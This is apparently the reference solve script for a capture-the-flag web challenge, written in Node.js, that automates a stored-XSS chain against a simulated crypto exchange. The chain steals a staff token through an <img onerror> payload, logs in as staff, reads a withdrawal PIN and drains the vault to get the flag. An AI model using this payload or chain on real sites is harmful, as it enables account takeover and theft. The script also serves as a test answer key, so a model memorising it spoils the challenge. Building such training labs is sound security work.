// Reference solve — Binanse, Inquisitor. The stored-XSS chain:
//   register a fresh user → read the wallet address from /dashboard → store a support ticket whose body is an
//   <img onerror> payload → request a staff review (runs the body in the simulated DevOps browser) → read the
//   DevOps token the payload exfiltrated into the public attacker inbox (/attacker) → sign in at /staff/login with
//   it → read the withdrawal PIN from /staff/settings → whitelist the player's own wallet → transfer the whole vault
//   balance → the receipt reveals the flag. Node fetch has no cookie jar, so this keeps a tiny manual one and follows
//   303 redirects by hand. Prints only the flag; on any refusal it exits 0 silently (like the other reference solves).
const base = process.argv[2];
if (!base) process.exit(0);

const jar = new Map();

function absorbCookies(res) {
  const list = typeof res.headers.getSetCookie === 'function' ? res.headers.getSetCookie() : [];
  for (const sc of list) {
    const first = sc.split(';')[0];
    const i = first.indexOf('=');
    if (i < 0) continue;
    const name = first.slice(0, i).trim();
    const value = first.slice(i + 1).trim();
    if (!value) jar.delete(name);
    else jar.set(name, value);
  }
}
const cookieHeader = () => [...jar.entries()].map(([k, v]) => `${k}=${v}`).join('; ');

async function req(method, path, { body, headers = {} } = {}) {
  const h = { ...headers };
  if (jar.size) h.cookie = cookieHeader();
  const res = await fetch(base + path, { method, headers: h, body, redirect: 'manual' });
  absorbCookies(res);
  return res;
}
const form = (obj) => ({ body: new URLSearchParams(obj), headers: { 'content-type': 'application/x-www-form-urlencoded' } });

const rnd = () => Math.random().toString(36).slice(2, 10);
const username = `u${rnd()}`;
const password = `S3cure!${rnd()}`;

// 1. Register and open a session.
await req('POST', '/register', form({ username, password }));

// 2. Read the wallet address from the dashboard.
const dash = await req('GET', '/dashboard');
if (!dash.ok) process.exit(0);
const wallet = /data-wallet="([^"]+)"/.exec(await dash.text())?.[1];
if (!wallet) process.exit(0);

// 3. Store the support ticket with the event-handler payload (the body is stored raw).
const payload = `<img src=x onerror="fetch('/api/attacker/inbox',{method:'POST',headers:{'content-type':'text/plain'},body:localStorage.getItem('bn_staff_token')})">`;
const created = await req('POST', '/tickets', form({ subject: 'deposit missing', body: payload }));
const ticketId = /\/tickets\/(\d+)/.exec(created.headers.get('location') ?? '')?.[1];
if (!ticketId) process.exit(0);

// 4. Request the staff review (the simulated DevOps browser runs the payload and posts the token to the inbox).
await req('POST', `/tickets/${ticketId}/review`);

// 5. Read the exfiltrated DevOps token from the attacker inbox.
const inboxRes = await req('GET', '/attacker');
if (!inboxRes.ok) process.exit(0);
const inboxHtml = await inboxRes.text();
let token = '';
const entryRe = /data-inbox-entry="\d+">\s*<small>[\s\S]*?<\/small>([\s\S]*?)<\/div>/g;
let m;
while ((m = entryRe.exec(inboxHtml))) token = m[1].trim();
if (!/^[A-Za-z0-9_-]{20,}$/.test(token)) process.exit(0);

// 6. Sign in at the staff console with the stolen token (sets the HttpOnly bn_staff cookie).
await req('POST', '/staff/login', form({ token }));

// 7. Read the 6-digit withdrawal PIN from staff settings.
const settings = await req('GET', '/staff/settings');
if (!settings.ok) process.exit(0);
const pin = /data-pin="(\d{6})"/.exec(await settings.text())?.[1];
if (!pin) process.exit(0);

// 8. Read the whole vault balance from the staff console.
const consoleRes = await req('GET', '/staff');
if (!consoleRes.ok) process.exit(0);
const amount = /data-vault-balance="([^"]+)"/.exec(await consoleRes.text())?.[1]?.replace(/[^0-9.]/g, '');
if (!amount) process.exit(0);

// 9. Whitelist the player's own wallet, then transfer the whole vault balance to it.
await req('POST', '/staff/whitelist', form({ address: wallet }));
const transfer = await req('POST', '/staff/transfer', form({ address: wallet, pin, amount }));
if (!transfer.ok) process.exit(0);

// 10. The receipt is the only place the flag appears.
const fm = /HVWA\{[a-z2-7]{26}\}/.exec(await transfer.text());
if (!fm) process.exit(0);
console.log(fm[0]);
